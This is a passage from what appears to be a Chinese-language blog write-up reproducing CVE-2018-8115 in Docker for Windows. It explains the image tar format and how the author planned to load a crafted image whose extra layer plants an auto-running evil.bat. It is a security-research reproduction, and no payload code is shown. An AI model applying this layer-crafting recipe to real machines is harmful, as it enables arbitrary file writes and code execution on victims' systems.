class=image-caption></figcaption></figure></p><p>这时候注销重新登录，即可看到写入的 <code>evil.bat</code> 被自动执行：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b51176-fcfd-11ea-a952-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b51176-fcfd-11ea-a952-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b51176-fcfd-11ea-a952-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b51176-fcfd-11ea-a952-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b51176-fcfd-11ea-a952-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b51176-fcfd-11ea-a952-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b51176-fcfd-11ea-a952-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><hr><h2 id=踩坑日记>踩坑日记</h2><p>在最开始，直接使用作者的 <code>PoC</code> 时，会直接报错，最后一步上传镜像到 Registry 时会直接提示 500，如下：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b531da-fcfd-11ea-9e4b-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b531da-fcfd-11ea-9e4b-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b531da-fcfd-11ea-9e4b-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b531da-fcfd-11ea-9e4b-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b531da-fcfd-11ea-9e4b-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b531da-fcfd-11ea-9e4b-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b531da-fcfd-11ea-9e4b-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>因为对 Docker 不是很熟悉，所以这个问题不知道怎么去解决，通过不断的搜寻资料，深入学习了 Docker 的一点知识，才将该问题解决，这里记录下解决的过程。</p><h3 id=docker学习>Docker学习</h3><p>众所周知，Docker 是通过镜像来创建容器的。而一个镜像的构成，是由层（layer）的形式构成的。在每一层中，存储的都是当前层与上一层之间的文件变化，在容器构建的时候，Docker 会将每一层依次的组合在一起形成文件系统，最后在顶层加上容器层以便修改。在镜像中，每多一层镜像的体积就会大一些，这也是为什么 Dockerfile 推荐尽可能的减少行数，因为每多添加一行，镜像中的层就多一层，最后导致镜像体积变得很大。</p><p>上面大概介绍了镜像的构造，接下来详细介绍下镜像的文件存储结构，这里使用 Windows 容器 <a href=https://hub.docker.com/_/microsoft-windows-nanoserver target=_blank rel="noopener noreffer">NanoServer</a> 来做演示，首先在命令行中输入命令 <code>docker pull mcr.microsoft.com/windows/nanoserver:10.0.14393.2068</code> 下载 NanoServer 镜像，如下：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b54df4-fcfd-11ea-95e0-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b54df4-fcfd-11ea-95e0-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b54df4-fcfd-11ea-95e0-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b54df4-fcfd-11ea-95e0-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b54df4-fcfd-11ea-95e0-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b54df4-fcfd-11ea-95e0-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b54df4-fcfd-11ea-95e0-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>接下来，将镜像导出为 <code>tar</code> 格式的文件，在 PowerShell 中输入如下命令：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash><span class=nb>cd</span> ~
mkdir <span class=nb>test</span>
<span class=nb>cd</span> <span class=nb>test</span>
docker save -o nanoserver.tar mcr.microsoft.com/windows/nanoserver:10.0.14393.2068
</code></pre></td></tr></table></div></div><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b570f6-fcfd-11ea-9e22-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b570f6-fcfd-11ea-9e22-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b570f6-fcfd-11ea-9e22-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b570f6-fcfd-11ea-9e22-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b570f6-fcfd-11ea-9e22-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b570f6-fcfd-11ea-9e22-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b570f6-fcfd-11ea-9e22-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>导出之后将其解压，可看到其中有如下文件和目录：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b59812-fcfd-11ea-845e-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b59812-fcfd-11ea-845e-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b59812-fcfd-11ea-845e-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b59812-fcfd-11ea-845e-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b59812-fcfd-11ea-845e-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b59812-fcfd-11ea-845e-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b59812-fcfd-11ea-845e-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>一个完整的镜像的 <code>tar</code> 包格式一般如下：</p><ul><li><code>manifest.json</code>：整个镜像的清单信息，包含着镜像每一层数据所处的文件位置，并且该文件的 <code>SHA256</code> 还与镜像的摘要有关</li><li><code>镜像id.json</code>：镜像的配置信息，包含镜像的的各个信息，最重要的是包含镜像修改的历史记录以及每一层数据的摘要</li><li><code>repositories</code>：一般保存的是镜像的 <code>tag</code> 与 <code>id</code> 的对应关系</li><li>每一层的目录：<ul><li><code>json</code>：该层的信息</li><li><code>layer.tar</code>：该层未压缩的 <code>tar</code> 包，存储与上一层的文件变化</li><li><code>VERSION</code>：该层的版本，一般为 <code>1.0</code></li></ul></li></ul><p>首先来看 <code>manifest.json</code>，该文件是整个镜像的清单文件，保存的镜像中每一层的数据的所在位置，如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-json data-lang=json><span class=p>[</span>
  <span class=p>{</span>
    <span class=nt>&#34;Config&#34;</span><span class=p>:</span> <span class=s2>&#34;8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.json&#34;</span><span class=p>,</span>
    <span class=nt>&#34;RepoTags&#34;</span><span class=p>:</span> <span class=p>[</span>
      <span class=s2>&#34;mcr.microsoft.com/windows/nanoserver:10.0.14393.2068&#34;</span>
    <span class=p>],</span>
    <span class=nt>&#34;Layers&#34;</span><span class=p>:</span> <span class=p>[</span>
      <span class=s2>&#34;ad4ea25c1eec6037158aa418802620adec29cc64c56569c38ca5211ab74f93da\\layer.tar&#34;</span><span class=p>,</span>
      <span class=s2>&#34;3128d665ad88b5e4d2111974265579b4b0fc70bfe10da79c27fc984f31098431\\layer.tar&#34;</span>
    <span class=p>],</span>
    <span class=nt>&#34;LayerSources&#34;</span><span class=p>:</span> <span class=p>{</span>
      <span class=nt>&#34;sha256:06def82ae218583423386cf68ab2dbb0715e69132d9b74e2fbdd9173142ef6f7&#34;</span><span class=p>:</span> <span class=p>{</span>
        <span class=nt>&#34;mediaType&#34;</span><span class=p>:</span> <span class=s2>&#34;application/vnd.docker.image.rootfs.foreign.diff.tar.gzip&#34;</span><span class=p>,</span>
        <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=mi>152802641</span><span class=p>,</span>
        <span class=nt>&#34;digest&#34;</span><span class=p>:</span> <span class=s2>&#34;sha256:cb1aafb7147372cc64faa070b94a893b8cd2e3de3a0e8001dc225c627d991c58&#34;</span><span class=p>,</span>
        <span class=nt>&#34;urls&#34;</span><span class=p>:</span> <span class=p>[</span>
          <span class=s2>&#34;https://go.microsoft.com/fwlink/?linkid=867858&#34;</span>
        <span class=p>]</span>
      <span class=p>},</span>
      <span class=nt>&#34;sha256:6c357baed9f5177e8c8fd1fa35b39266f329535ec8801385134790eb08d8787d&#34;</span><span class=p>:</span> <span class=p>{</span>
        <span class=nt>&#34;mediaType&#34;</span><span class=p>:</span> <span class=s2>&#34;application/vnd.docker.image.rootfs.foreign.diff.tar.gzip&#34;</span><span class=p>,</span>
        <span class=nt>&#34;size&#34;</span><span class=p>:</span> <span class=mi>252691002</span><span class=p>,</span>
        <span class=nt>&#34;digest&#34;</span><span class=p>:</span> <span class=s2>&#34;sha256:bce2fbc256ea437a87dadac2f69aabd25bed4f56255549090056c1131fad0277&#34;</span><span class=p>,</span>
        <span class=nt>&#34;urls&#34;</span><span class=p>:</span> <span class=p>[</span>
          <span class=s2>&#34;https://go.microsoft.com/fwlink/?linkid=837858&#34;</span>
        <span class=p>]</span>
      <span class=p>}</span>
    <span class=p>}</span>
  <span class=p>}</span>
<span class=p>]</span>
</code></pre></td></tr></table></div></div><p>在该文件中，以下字段是相对重要的：</p><ul><li>Config：指定镜像的配置文件，可以看到镜像解压目录下有同名的 <code>8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.json</code> 文件</li><li>RepoTags：镜像的 <code>name</code> 与 <code>tag</code>，在这里 <code>name</code> 为 <code>mcr.microsoft.com/windows/nanoserver</code>，<code>tag</code> 为 <code>10.0.14393.2068</code></li><li>Layers：一个保存每层的 <code>layer.tar</code> 文件路径的列表，顺序由底层到顶层，可以看到这里的两个值分别对应解压目录中的文件</li></ul><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b5c676-fcfd-11ea-b109-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b5c676-fcfd-11ea-b109-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b5c676-fcfd-11ea-b109-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b5c676-fcfd-11ea-b109-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b5c676-fcfd-11ea-b109-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b5c676-fcfd-11ea-b109-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b5c676-fcfd-11ea-b109-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>再来看 <code>8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.json</code>，该文件为镜像的配置信息，包含了镜像的大部分信息，其中最重要的字段是 <code>history</code> 与 <code>rootfs</code>，如下（为节省篇幅这里省略了部分信息）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-json data-lang=json><span class=p>{</span>
  <span class=err>//</span> <span class=err>...</span>
  <span class=nt>&#34;history&#34;</span><span class=p>:</span> <span class=p>[</span>
    <span class=p>{</span>
      <span class=nt>&#34;created&#34;</span><span class=p>:</span> <span class=s2>&#34;2016-12-13T10:47:17Z&#34;</span><span class=p>,</span>
      <span class=nt>&#34;created_by&#34;</span><span class=p>:</span> <span class=s2>&#34;Apply image 10.0.14393.0&#34;</span>
    <span class=p>},</span>
    <span class=p>{</span>
      <span class=nt>&#34;created&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-02-13T19:43:23Z&#34;</span><span class=p>,</span>
      <span class=nt>&#34;created_by&#34;</span><span class=p>:</span> <span class=s2>&#34;Install update 10.0.14393.2068&#34;</span>
    <span class=p>}</span>
  <span class=p>],</span>
  <span class=nt>&#34;rootfs&#34;</span><span class=p>:</span> <span class=p>{</span>
    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;layers&#34;</span><span class=p>,</span>
    <span class=nt>&#34;diff_ids&#34;</span><span class=p>:</span> <span class=p>[</span>
      <span class=s2>&#34;sha256:6c357baed9f5177e8c8fd1fa35b39266f329535ec8801385134790eb08d8787d&#34;</span><span class=p>,</span>
      <span class=s2>&#34;sha256:06def82ae218583423386cf68ab2dbb0715e69132d9b74e2fbdd9173142ef6f7&#34;</span>
    <span class=p>]</span>
  <span class=p>}</span>
<span class=p>}</span>
</code></pre></td></tr></table></div></div><p>可以看到 <code>history</code> 记录的是镜像修改的信息，而 <code>rootfs</code> 的 <code>diff_ids</code> 记录的是每一层的 <code>Digest</code>。在这个演示中 <code>history</code> 并不重要，这里着重讲一下 <code>rootfs</code>。</p><p><code>rootfs</code> 存储的是每一层的 <code>Digest</code>，也就是每一层的 <code>layer.tar</code> 的 <code>SHA256</code>，格式为 <code>sha256:SHA256(layer.tar)</code>，顺序由底层到顶层。这里我们实践一下，在 PowerShell 中使用 <code>Get-FileHash -Algorithm SHA256 文件名</code> 计算文件的 <code>SHA256</code>，计算结果如下：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b5ed8c-fcfd-11ea-bc6a-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b5ed8c-fcfd-11ea-bc6a-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b5ed8c-fcfd-11ea-bc6a-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b5ed8c-fcfd-11ea-bc6a-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b5ed8c-fcfd-11ea-bc6a-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b5ed8c-fcfd-11ea-bc6a-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b5ed8c-fcfd-11ea-bc6a-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>再来看该文件本身，该文件的 <code>SHA256</code>，不仅为它自身的文件名，还为该镜像的 <code>IMAGE ID</code>，如下：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b61552-fcfd-11ea-bcad-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b61552-fcfd-11ea-bcad-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b61552-fcfd-11ea-bcad-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b61552-fcfd-11ea-bcad-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b61552-fcfd-11ea-bcad-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b61552-fcfd-11ea-bcad-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b61552-fcfd-11ea-bcad-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>最后再来看每一层目录中的内容，每层的目录名的计算方式没有找到，这个不重要，只要能在 <code>manifest.json</code> 文件中写对就行了。其次是目录中的内容，<code>VERSION</code> 是版本信息，这个不用管，<code>layer.tar</code> 是重要的层次文件变化信息，该文件的 <code>SHA256</code> 需要写入到镜像配置文件中，tar 包里的文件内容全是上一层到这一层之间的文件变化信息，也可以先不用管。最主要的是 <code>.json</code> 这个文件，该文件中记录了该层的一些信息，其中最重要的字段是 <code>id</code> 与 <code>parent</code>。<code>id</code> 其实就是当前目录的名称，<code>parent</code> 为父层目录的名称，如果没有父层则没有这个字段，这里的演示结果如下：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b63b7a-fcfd-11ea-a564-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b63b7a-fcfd-11ea-a564-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b63b7a-fcfd-11ea-a564-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b63b7a-fcfd-11ea-a564-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b63b7a-fcfd-11ea-a564-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b63b7a-fcfd-11ea-a564-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b63b7a-fcfd-11ea-a564-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>总结下镜像的存储要点：</p><ul><li>镜像存储的格式一般为 <code>manifest.json</code>、<code>镜像id.json</code>、各层的目录，而各层的目录下存在 <code>layer.tar</code>、<code>json</code>、<code>VERSION</code></li><li><code>镜像id.json</code> 保存着镜像的大部分信息，其中 <code>rootfs</code> 记载着每一层的 <code>Digest</code>，顺序由底层到顶层。该文件本身的 <code>SHA256</code> 信息为它自己的文件名、镜像 id</li><li><code>manifest.json</code> 指定镜像的配置文件名称，还包含着每一层文件的具体位置</li><li>每一层目录下的 <code>layer.tar</code> 为主要的层次文件变化信息，<code>json</code> 文件记载着该层的信息，其中包括指向父层的目录 <code>parent</code> 字段</li></ul><h3 id=问题分析>问题分析</h3><p>大概了解了镜像的存储格式之后，现在来分析下问题。在漏洞作者给出的脚本中，做的事大概有如下几件：</p><ul><li>生成 <code>demo.tar</code> 与 <code>evil.tar</code>，<code>demo.tar</code> 为 Dockerfile 生成的layer信息，<code>evil.tar</code> 为恶意文件，然后将两者合并为 <code>layer.tar</code></li><li>上传 <code>layer.tar</code> 到私有仓库，这个文件相当于镜像中的 layer 了</li><li>上传 <code>config.json</code> 到私有仓库，这个文件相当于镜像中的 <code>镜像id.json</code></li><li>上传 <code>manifest.json</code> 到私有仓库，这个文件相当于镜像中的 <code>manifest.json</code></li></ul><p>前面三步都是很正常的运行完了，最后上传 <code>manifest.json</code> 时出错了，报错信息如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-json data-lang=json><span class=p>{</span>
  <span class=nt>&#34;errors&#34;</span><span class=p>:</span> <span class=p>[</span>
    <span class=p>{</span>
      <span class=nt>&#34;code&#34;</span><span class=p>:</span> <span class=s2>&#34;UNKNOWN&#34;</span><span class=p>,</span>
      <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;unknown error&#34;</span>
    <span class=p>},</span>
    <span class=p>{</span>
      <span class=nt>&#34;code&#34;</span><span class=p>:</span> <span class=s2>&#34;UNKNOWN&#34;</span><span class=p>,</span>
      <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;unknown error&#34;</span><span class=p>,</span>
      <span class=nt>&#34;detail&#34;</span><span class=p>:</span> <span class=p>{}</span>
    <span class=p>},</span>
    <span class=p>{</span>
      <span class=nt>&#34;code&#34;</span><span class=p>:</span> <span class=s2>&#34;MANIFEST_BLOB_UNKNOWN&#34;</span><span class=p>,</span>
      <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;blob unknown to registry&#34;</span><span class=p>,</span>
      <span class=nt>&#34;detail&#34;</span><span class=p>:</span> <span class=s2>&#34;sha256:bce2fbc256ea437a87dadac2f69aabd25bed4f56255549090056c1131fad0277&#34;</span>
    <span class=p>},</span>
    <span class=p>{</span>
      <span class=nt>&#34;code&#34;</span><span class=p>:</span> <span class=s2>&#34;UNKNOWN&#34;</span><span class=p>,</span>
      <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;unknown error&#34;</span>
    <span class=p>},</span>
    <span class=p>{</span>
      <span class=nt>&#34;code&#34;</span><span class=p>:</span> <span class=s2>&#34;UNKNOWN&#34;</span><span class=p>,</span>
      <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;unknown error&#34;</span><span class=p>,</span>
      <span class=nt>&#34;detail&#34;</span><span class=p>:</span> <span class=p>{}</span>
    <span class=p>},</span>
    <span class=p>{</span>
      <span class=nt>&#34;code&#34;</span><span class=p>:</span> <span class=s2>&#34;MANIFEST_BLOB_UNKNOWN&#34;</span><span class=p>,</span>
      <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;blob unknown to registry&#34;</span><span class=p>,</span>
      <span class=nt>&#34;detail&#34;</span><span class=p>:</span> <span class=s2>&#34;sha256:cb1aafb7147372cc64faa070b94a893b8cd2e3de3a0e8001dc225c627d991c58&#34;</span>
    <span class=p>}</span>
  <span class=p>]</span>
<span class=p>}</span>
</code></pre></td></tr></table></div></div><p>其中有 <code>MANIFEST_BLOB_UNKNOWN</code> 错误，根据<a href=https://docs.docker.com/registry/spec/api/#errors-2 target=_blank rel="noopener noreffer">官方资料</a>，得知该错误是找不到 blob，也就是找不到对应的 layer 信息，导致私有仓库根据 <code>config.json</code> 和 <code>manifest.json</code> 构建镜像时失败了。</p><p>大概知道原因之后，但无法继续了。首先无法确定到底是不是上面分析的错误原因，因为从上面的报错信息来看，有很多个错误信息，找不到 blob 只是其中的一个。其次如果真的是找不到 blob 的缘故，那应该把 <code>manifest.json</code> 信息中的两个 blob 传上去就行了，但是这两个 blob 太大了，需要用官方的分块传输 API，使用起来太费劲了。</p><p>因为上述原因，在这里卡了很久，在这期间学习了上面的 Docker 镜像存储的知识。学得差不多的时候，回过头一想，是不是可以不用这种方式实现漏洞攻击呢？于是详细猜测了下漏洞原理，作者复现漏洞使用的是 <code>docker pull</code>，<code>pull</code> 之后即可看到恶意文件被写入了系统，这里思考一下为什么能达到这个效果，推测在使用 <code>docker pull</code> 命令时会将镜像存储在本地（经过后面的学习验证的确是这样），然后存储的时候未处理好导致了漏洞的产生。猜到这里之后，再想到 <code>docker load</code> 也可以导入镜像，那是不是用 <code>docker load</code> 也能实现这个漏洞效果呢？说干就干，<code>docker load</code> 需要一个 <code>tar</code> 的镜像，那就可以构造一个恶意镜像，然后 <code>docker load</code> 这个镜像，来验证猜想。</p><p>这个镜像该如何构造呢，其实可以参照漏洞作者的做法。从漏洞作者的脚本上来看，其实他也是使用的是 <code>NanoServer</code> 镜像，然后再原有的两个 layer 上多添加了一层，就是他自己构造的恶意文件那一层，所以我这里也是模拟的他的做法，再原有基础上再添加一层，把恶意文件添加成新的一层，然后更改相应的配置信息即可。</p><p>首先将漏洞作者脚本里生成的恶意文件 tar 包给导出来，脚本如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
